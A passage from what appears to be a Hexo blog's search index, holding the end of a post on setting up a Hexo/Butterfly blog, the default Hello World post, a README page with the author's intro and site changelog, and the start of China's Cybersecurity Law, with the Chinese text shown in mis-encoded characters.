ç›®å½•ä¸‹ä»¥<code>markdown</code> çš„æ ¼å¼ç¼–è¾‘åšå®¢æ–‡ç« ã€‚</p><blockquote><p>Front-matter</p></blockquote><p>Front-matter æ˜¯mdæ–‡ä»¶æœ€ä¸Šæ–¹ä»¥<code>---</code>åˆ†éš”çš„åŒºåŸŸï¼Œç”¨äºæŒ‡å®šæ¯ç¯‡åšå®¢çš„ä¿¡æ¯ã€‚</p><p>å¦‚æœæ ‡æ³¨<code>å¯é€‰</code>çš„å‚æ•°ï¼Œå¯æ ¹æ®è‡ªå·±éœ€è¦æ·»åŠ ï¼Œä¸ç”¨å…¨éƒ¨éƒ½å†™åœ¨markdowné‡Œ</p><p><strong>Page Front-matter</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">description:</span><br><span class="line">comments:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">aside:</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">å†™æ³•</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">title</td><td align="center">ã€å¿…éœ€ã€‘é¡µé¢æ ‡é¢˜</td></tr><tr><td align="center">date</td><td align="center">ã€å¿…éœ€ã€‘é¡µé¢åˆ›å»ºæ—¥æœŸ</td></tr><tr><td align="center">type</td><td align="center">ã€å¿…éœ€ã€‘æ ‡ç­¾ã€åˆ†ç±»ç­‰é¡µé¢éœ€è¦é…ç½®</td></tr><tr><td align="center">updated</td><td align="center">ã€å¯é€‰ã€‘é¡µé¢æ›´æ–°æ—¥æœŸ</td></tr><tr><td align="center">description</td><td align="center">ã€å¯é€‰ã€‘é¡µé¢æè¿°</td></tr><tr><td align="center">comments</td><td align="center">ã€å¯é€‰ã€‘æ˜¾ç¤ºé¡µé¢è¯„è®ºæ¨¡å—(é»˜è®¤ true)</td></tr><tr><td align="center">top_img</td><td align="center">ã€å¯é€‰ã€‘é¡µé¢é¡¶éƒ¨å›¾ç‰‡</td></tr><tr><td align="center">aside</td><td align="center">ã€å¯é€‰ã€‘æ˜¾ç¤ºä¾§è¾¹æ  (é»˜è®¤ true)</td></tr></tbody></table><p><strong>Post Front-matter</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">sticky:</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">å†™æ³•</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">title</td><td align="center">ã€å¿…éœ€ã€‘æ–‡ç« æ ‡é¢˜</td></tr><tr><td align="center">date</td><td align="center">ã€å¿…éœ€ã€‘æ–‡ç« åˆ›å»ºæ—¥æœŸ</td></tr><tr><td align="center">updated</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« æ›´æ–°æ—¥æœŸ</td></tr><tr><td align="center">tags</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« æ ‡ç­¾</td></tr><tr><td align="center">categories</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« åˆ†ç±»</td></tr><tr><td align="center">top_img</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« é¡¶éƒ¨å›¾ç‰‡</td></tr><tr><td align="center">cover</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« å°é¢</td></tr><tr><td align="center">sticky</td><td align="center">ã€å¯é€‰ã€‘æ–‡ç« ç½®é¡¶ï¼Œæ•°å€¼è¶Šå¤§ï¼Œç½®é¡¶çš„ä¼˜å…ˆçº§è¶Šå¤§ã€‚</td></tr></tbody></table><p>åšå®¢ç¼–è¾‘å®Œæˆåï¼Œä»ç„¶æ˜¯é€šè¿‡è¿™ä¸‰æ­¥å‘å¸ƒæ–‡ç« </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>å‘å¸ƒä¹‹å‰ï¼Œåœ¨æœ¬åœ°é¢„è§ˆåšå®¢ç”¨åˆ°çš„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Vla8QmTZKeF7SLX.png" alt="image-20210131023529206"></p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><blockquote><p>æ€»çš„æ¥è¯´ï¼Œè¿™æ¬¡çš„æ­å»ºè¿‡ç¨‹è¿˜ç®—é¡ºåˆ©ï¼ŒæœŸé—´é‡åˆ°çš„ä¸€äº›é—®é¢˜ä¹Ÿé€šè¿‡æµè§ˆå¤§ä½¬çš„æ–‡ç« è§£å†³äº†ï¼Œæ„Ÿè°¢ä»–ä»¬çš„åˆ†äº«ã€‚ç½‘ç»œä¸Šå…³äºåˆ©ç”¨Hexoæ­å»ºåšå®¢çš„èµ„æ–™æœ‰å¾ˆå¤šï¼Œå†™è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯ä¸ºäº†è®°å½•æ­¤æ¬¡æ­å»ºåšå®¢çš„è¿‡ç¨‹ï¼Œä¾¿äºåç»­å¯èƒ½å†æ¬¡éƒ¨ç½²ï¼ŒåŒæ—¶ä¹Ÿå¸Œæœ›èƒ½å¸®åŠ©åˆ°æœ‰éœ€è¦çš„æœ‹å‹ã€‚å®Œç»“æ’’èŠ±~~</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1]  <a href="https://hexo.io/zh-cn/docs/">Hexoæ–‡æ¡£</a></p><p>[2]  <a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly å®‰è£…æ–‡æ¡£</a></p><p>[3]  <a href="https://www.jianshu.com/p/ea5ac6162a96">GitPages + Hexo,ä»0åˆ°1æ­å»ºä¸ªäººåšå®¢</a></p><p>[4] <a href="https://www.milovetingting.cn/2020/01/06/Web/Hexo+Butterfly+Github+Coding%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#Hexo-Butterfly-Github-Coding%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">Hexo+Butterfly+Github+Codingæ­å»ºä¸ªäººåšå®¢</a></p><p>[5] <a href="https://www.heson10.com/posts/54971.html">Hexoåœ¨GitHubå’ŒCodingåŒçº¿éƒ¨ç½²æ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/16107.html"/>
      <url>posts/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>æœ‹å‹åœˆ</title>
      <link href="fcircle/index.html"/>
      <url>fcircle/index.html</url>
      
        <content type="html"><![CDATA[<div id="moments_container" ></div><script src="moments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="manifest.json"/>
      <url>manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ç¢ç¢å¿µ</title>
      <link href="speak/index.html"/>
      <url>speak/index.html</url>
      
        <content type="html"><![CDATA[<p>â€‹<br>â€‹<br>â€‹<br>â€‹        </p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å‹é“¾</title>
      <link href="link/index.html"/>
      <url>link/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="æˆ‘çš„Blogä¿¡æ¯"><a href="#æˆ‘çš„Blogä¿¡æ¯" class="headerlink" title="æˆ‘çš„Blogä¿¡æ¯"></a>æˆ‘çš„Blogä¿¡æ¯</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">wawyw</span></span><br><span class="line">  <span class="attr">link:</span> <span class="string">https://www.wawyw.top/</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">https://www.wawyw.top/avatar.webp</span></span><br><span class="line">  <span class="attr">descr:</span> <span class="string">æ´»åœ¨å½“ä¸‹</span> <span class="string">é¡ºåŠ¿è€Œä¸º</span></span><br></pre></td></tr></table></figure><div class='tip info'><p>æ¬¢è¿äº¤æ¢å‹é“¾ğŸš€<p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>README</title>
      <link href="readme/index.html"/>
      <url>readme/index.html</url>
      
        <content type="html"><![CDATA[<div class='tip success'><p>æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼Œè¿™æ˜¯ä¸€ä¸ªè®°å½•å­¦ä¹ çš„åœ°æ–¹ï¼Œåƒæˆ‘è¿™æ ·çš„åºŸç‰©éœ€è¦å¤šè®°âœ<p></div><div class='tip info'><p>å°ç«™çš„å¤§éƒ¨åˆ†ç¾åŒ–ã€é­”æ”¹æ¥è‡ªï¼ˆç™½å«–ï¼‰äºå¤§ä½¬ä»¬çš„åšå®¢ï¼Œæ„Ÿè°¢åˆ†äº«ï¼ğŸ¨<p></div><div class='tip warning'><p>åšå®¢ä¸­çš„éƒ¨åˆ†æ–‡å­—ã€å›¾ç‰‡æ¥æºäºç½‘ç»œï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åˆ é™¤ã€‚ğŸš«<p></div><div class="tip ffa font5 fas fa-cogs"><p><del>æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿï¼</del>å¶å°”æ¬ç –ï¼Œæ—¥å¸¸æ‘¸é±¼ing...ğŸŸ</p><p></p></div><h1>ä¸ªäººç®€ä»‹</h1><div class="checkbox cyan">  <input type="radio" />  <p>æ¥è‡ªé˜¿å¡æ—çœï¼Œé£æ™¯è¿™è¾¹ç‹¬å¥½ğŸŒˆ</p></div><div class="checkbox blue">  <input type="radio" />  <p>æŸé‚®ç”µå¤§å­¦å¤§ä¸€ Studentï¼Œç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šåœ¨è¯»ğŸ‘€</p></div><div class="checkbox yellow">  <input type="radio" />  <p>å¯¹ä¸€åˆ‡æ–°é²œçš„äº‹ç‰©å……æ»¡å¥½å¥‡ğŸ§</p></div><div class="checkbox green">  <input type="radio" />  <p>æ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹ï¼Œæ—©æ—¥æˆä¸ºç™½å¸½å­ä¸€å‘˜ğŸ‘Š</p></div><h1>æŠ€èƒ½å­¦ä¹ </h1><div class="checkbox minus yellow checked">  <input type="checkbox" checked />  <p>Webå®‰å…¨åŸºç¡€ï¼ˆå­¦ä¹ ä¸­...ï¼‰</p></div><div class="checkbox minus green checked">  <input type="checkbox" checked />  <p>æ¼æ´æŒ–æ˜ï¼ˆå­¦ä¹ ä¸­...ï¼‰</p></div><div class="checkbox minus red checked">  <input type="checkbox" checked />  <p>æ¸—é€æµ‹è¯•ï¼ˆæœªå­¦ä¹ ï¼‰</p></div><div class="checkbox minus blue checked">  <input type="checkbox" checked />  <p>å¾…å­¦ä¹ çš„æŠ€æœ¯ï¼šå¤šç€å‘¢ï¼Œéƒ½å­¦ä¸æ¥</p></div><h1>èƒ½åŠ›ç‰¹é•¿</h1><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>ç²¾é€š Cã€C++ã€Pythonã€Javaã€Javascriptã€JSPã€PHPã€Perlã€Goç­‰å•è¯çš„æ‹¼å†™</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>æ“…é•¿ PSã€Prã€Aeã€Auã€Aiã€Dwã€Flã€Idã€Sgã€Scç­‰è½¯ä»¶çš„å®‰è£…ä¸å¸è½½</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>ç†Ÿæ‚‰ Windowsã€Linuxã€Macã€Androidã€IOSç­‰ç³»ç»Ÿçš„å¼€å…³æœº</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p> æ“ä½œ <kbd>Ctrl</kbd> + <kbd>C</kbd> && <kbd>Ctrl</kbd> + <kbd>V</kbd> çƒ‚ç†Ÿäºå¿ƒ</p></div><h1>2021ã®flag</h1><div class="checkbox green checked">  <input type="checkbox" checked />  <p>æŒ‰æ—¶ç¢è§‰ï¼Œç‹—å‘½è¦ç´§</p></div><div class="checkbox blue checked">  <input type="checkbox" checked />  <p>åšæŒé”»ç‚¼ï¼ŒåšæŒæ›´åš</p></div><div class="checkbox yellow checked">  <input type="checkbox" checked />  <p>æ··è¿¹ctfï¼Œå¥½å¥½åšä¸ªç­¾åˆ°é¢˜é€‰æ‰‹</p></div><div class="checkbox red checked">  <input type="checkbox" checked />  <p>ä¸åšç§¯æåºŸäºº</p></div><div class="checkbox cyan checked">  <input type="checkbox" checked />  <p>åšæ¯”æ˜¨å¤©æ›´å‰å®³çš„è‡ªå·±</p></div><div class="timeline"><p class='p h2'>å°ç«™ç ´äº‹</p><div class="timenode"><div class="meta"><p><p>2021-05-12</p></p></div><div class="body"><p>ğŸ‰ğŸ‰ğŸ‰å¯å–œå¯è´ºï¼Œå°ç«™ç ´å£³ç™¾å¤©ï¼</p></div></div><div class="timenode"><div class="meta"><p><p>2021-05-11</p></p></div><div class="body"><ol><li>å°ç«™è¢«ç™¾åº¦æ”¶å½•ï¼ˆGoogleæ—©æ”¶å½•äº†ï¼‰</li><li>å¢åŠ Pixivæ—¥æ¦œTop50</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-05-08</p></p></div><div class="body"><p>ä½¿ç”¨åˆæ‹äº‘CDNä¸€å¤©ï¼Œä¸çŸ¥æ˜¯ä½•åŸå› è‡´ä½¿å°ç«™æ— æ³•è®¿é—®ï¼ˆè²Œä¼¼è¯ä¹¦å‡ºç°é—®é¢˜ï¼‰ï¼Œæ— å¥ˆæ¢å›è…¾è®¯äº‘ï¼Œå¹¶ä¹°äº†ä¸€å¹´çš„æµé‡åŒ…ï¼ˆ12ï¼‰</p></div></div><div class="timenode"><div class="meta"><p><p>2021-05-07</p></p></div><div class="body"><p>æ¢ç”¨ <a href="https://www.upyun.com/">åˆæ‹äº‘</a> ä¸ºå°ç«™æä¾›CDNåŠ é€Ÿã€‚</p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-26</p></p></div><div class="body"><ol><li>å¢åŠ  Hexo Magnet</li><li>å¢åŠ  Butterfly Article Double Row</li><li>å¢åŠ  Hexo History Calendar</li></ol><p><b style="color:purple">å†°è€å¸ˆå¤ªå‰å®³å•¦ï¼Œæ’ä»¶åŒ…ä¸€é”®å®‰è£…å³å¯é£Ÿç”¨ã€‚</b></p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-24</p></p></div><div class="body"><ol><li>ä¿®æ”¹äº†éƒ¨åˆ†ä½ç½®çš„å­—ä½“ã€‚</li><li>æ›´æ¢äº†å…¨å±€é…è‰²ã€‚</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-11</p></p></div><div class="body"><ol><li>å°ç«™è®¤çœŸå­¦ä¹ äº†<a href="https://www.wawyw.top/law/">ç½‘ç»œå®‰å…¨æ³•</a>ï¼Œä¿è¯ä»¥åå¥åº·ã€ç§‘å­¦ä¸Šç½‘ï¼</li><li>å¿ç—›å»é™¤äº†çœ‹æ¿å¨˜ã€æ¨±èŠ±é£˜è½ã€éšæœºèƒŒæ™¯ç­‰æ•ˆæœã€‚</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-10</p></p></div><div class="body"><ol><li>å¢åŠ <a href="https://www.wawyw.top/speak/">ç¢ç¢å¿µ</a>é¡µé¢ï¼ŒPowered By <a href="https://artitalk.js.org/">Artitalk</a></li><li>åœ¨é¡¶éƒ¨æ·»åŠ å¤©æ°”æ’ä»¶ï¼Œå‚è€ƒäº<a href="https://cnhuazhu.gitee.io/2021/02/24/Hexo%E9%AD%94%E6%94%B9/Hexo%E5%9C%A8%E9%A1%B6%E9%83%A8%E5%A2%9E%E5%8A%A0%E5%A4%A9%E6%B0%94%E5%B0%8F%E9%83%A8%E4%BB%B6/">Hexoåœ¨é¡¶éƒ¨å¢åŠ å¤©æ°”å°éƒ¨ä»¶</a></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-09</p></p></div><div class="body"><p><a href="https://www.wawyw.top/README/">README</a>é¡µé¢ï¼ˆæ­¤é¡µé¢ï¼‰ç»ˆäºæ›´æ–°ã€‚å¤–æŒ‚æ ‡ç­¾å¥½ç”¨ï¼ŒçœŸçš„å¥½ç”¨ã€‚å‚è€ƒäº<a href="https://www.antmoe.com/posts/3b43914f/index.html">å°åº·çš„ butterfly ä¸»é¢˜ä½¿ç”¨æ–‡æ¡£</a>ã€‚</p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-08</p></p></div><div class="body"><p>å¯ç”¨<a href="https://zfe.space/">å†°è€å¸ˆ</a>çš„<a href="https://github.com/Zfour/hexo-circle-of-friends">å‹é“¾æœ‹å‹åœˆ</a>å’Œ<a href="https://github.com/Zfour/hexo-github-calendar">hexo-github-calendar</a>é¡¹ç›®ï¼Œæ•ˆæœå¾ˆæ£’ï¼Œæ„Ÿè°¢å†°è€å¸ˆçš„æŒ‡å¯¼ï¼</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-08</p></p></div><div class="body"><p>ä½¿ç”¨ <a href="https://cloud.tencent.com/product/cdn/">è…¾è®¯äº‘</a> ä¸ºå°ç«™æä¾›CDNåŠ é€Ÿã€‚</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-06</p></p></div><div class="body"><p>å°ç«™æ‰˜ç®¡äº<a href="https://coding.net/">Coding</a>ã€‚</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-05</p></p></div><div class="body"><p>åŸŸåå¤‡æ¡ˆå®¡æ ¸é€šè¿‡ï¼Œ<a href="https://beian.miit.gov.cn/">èµ£ICPå¤‡2021001120å·</a>ã€‚</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-02</p></p></div><div class="body"><p>SSLè¯ä¹¦å®¡æ ¸é€šè¿‡ï¼Œå†è§<code>http</code>ï¼Œæ¬¢è¿<code>https</code> ï¼</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-01</p></p></div><div class="body"><ol><li><a href="https://www.wawyw.top/">å°ç«™æ­£å¼</a>ä¸Šçº¿ï¼æœ¬ç«™é‡‡ç”¨<a href="https://hexo.io/">Hexo</a>æ¡†æ¶ï¼Œ<a href="https://butterfly.js.org/">Butterfly</a>ä¸»é¢˜ï¼Œæ‰˜ç®¡äº<a href="https://github.com/">Github</a>ï¼Œä½¿ç”¨ <a href="https://www.jsdelivr.com/">Jsdelivr</a> ä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿã€‚</li><li><a href="https://wanwang.aliyun.com/">é˜¿é‡Œäº‘</a>è´­ä¹°åŸŸå <code>wawyw.top</code></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-01-31</p></p></div><div class="body"><p>å°ç«™å³å°†ç ´å£³ï¼Œåå¤æµ‹è¯•ingâ€¦</p></div></div></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‡ç­¾</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ†ç±»</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•</title>
      <link href="law/index.html"/>
      <url>law/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -æ€»-åˆ™"><a href="#ç¬¬ä¸€ç« -æ€»-åˆ™" class="headerlink" title="ç¬¬ä¸€ç« ã€€æ€»ã€€åˆ™"></a>ç¬¬ä¸€ç« ã€€æ€»ã€€åˆ™</h1><p>ç¬¬ä¸€æ¡ã€€ä¸ºäº†ä¿éšœç½‘ç»œå®‰å…¨ï¼Œç»´æŠ¤ç½‘ç»œç©ºé—´ä¸»æƒå’Œå›½å®¶å®‰å…¨ã€ç¤¾ä¼šå…¬å…±åˆ©ç›Šï¼Œä¿æŠ¤å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡çš„åˆæ³•æƒç›Šï¼Œä¿ƒè¿›ç»æµç¤¾ä¼šä¿¡æ¯åŒ–å¥åº·å‘å±•ï¼Œåˆ¶å®šæœ¬æ³•ã€‚</p><p>ç¬¬äºŒæ¡ã€€åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å»ºè®¾ã€è¿è¥ã€ç»´æŠ¤å’Œä½¿ç”¨ç½‘ç»œï¼Œä»¥åŠç½‘ç»œå®‰å…¨çš„ç›‘ç£ç®¡ç†ï¼Œé€‚ç”¨æœ¬æ³•ã€‚</p><p>ç¬¬ä¸‰æ¡ã€€å›½å®¶åšæŒç½‘ç»œå®‰å…¨ä¸ä¿¡æ¯åŒ–å‘å±•å¹¶é‡ï¼Œéµå¾ªç§¯æåˆ©ç”¨ã€ç§‘å­¦å‘å±•ã€ä¾æ³•ç®¡ç†ã€ç¡®ä¿å®‰å…¨çš„æ–¹é’ˆï¼Œæ¨è¿›ç½‘ç»œåŸºç¡€è®¾æ–½å»ºè®¾å’Œäº’è”äº’é€šï¼Œé¼“åŠ±ç½‘ç»œæŠ€æœ¯åˆ›æ–°å’Œåº”ç”¨ï¼Œæ”¯æŒåŸ¹å…»ç½‘ç»œå®‰å…¨äººæ‰ï¼Œå»ºç«‹å¥å…¨ç½‘ç»œå®‰å…¨ä¿éšœä½“ç³»ï¼Œæé«˜ç½‘ç»œå®‰å…¨ä¿æŠ¤èƒ½åŠ›ã€‚</p><p>ç¬¬å››æ¡ã€€å›½å®¶åˆ¶å®šå¹¶ä¸æ–­å®Œå–„ç½‘ç»œå®‰å…¨æˆ˜ç•¥ï¼Œæ˜ç¡®ä¿éšœç½‘ç»œå®‰å…¨çš„åŸºæœ¬è¦æ±‚å’Œä¸»è¦ç›®æ ‡ï¼Œæå‡ºé‡ç‚¹é¢†åŸŸçš„ç½‘ç»œå®‰å…¨æ”¿ç­–ã€å·¥ä½œä»»åŠ¡å’Œæªæ–½ã€‚</p><p>ç¬¬äº”æ¡ã€€å›½å®¶é‡‡å–æªæ–½ï¼Œç›‘æµ‹ã€é˜²å¾¡ã€å¤„ç½®æ¥æºäºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å¤–çš„ç½‘ç»œå®‰å…¨é£é™©å’Œå¨èƒï¼Œä¿æŠ¤å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å…å—æ”»å‡»ã€ä¾µå…¥ã€å¹²æ‰°å’Œç ´åï¼Œä¾æ³•æƒ©æ²»ç½‘ç»œè¿æ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œç»´æŠ¤ç½‘ç»œç©ºé—´å®‰å…¨å’Œç§©åºã€‚</p><p>ç¬¬å…­æ¡ã€€å›½å®¶å€¡å¯¼è¯šå®å®ˆä¿¡ã€å¥åº·æ–‡æ˜çš„ç½‘ç»œè¡Œä¸ºï¼Œæ¨åŠ¨ä¼ æ’­ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œé‡‡å–æªæ–½æé«˜å…¨ç¤¾ä¼šçš„ç½‘ç»œå®‰å…¨æ„è¯†å’Œæ°´å¹³ï¼Œå½¢æˆå…¨ç¤¾ä¼šå…±åŒå‚ä¸ä¿ƒè¿›ç½‘ç»œå®‰å…¨çš„è‰¯å¥½ç¯å¢ƒã€‚</p><p>ç¬¬ä¸ƒæ¡ã€€å›½å®¶ç§¯æå¼€å±•ç½‘ç»œç©ºé—´æ²»ç†ã€ç½‘ç»œæŠ€æœ¯ç ”å‘å’Œæ 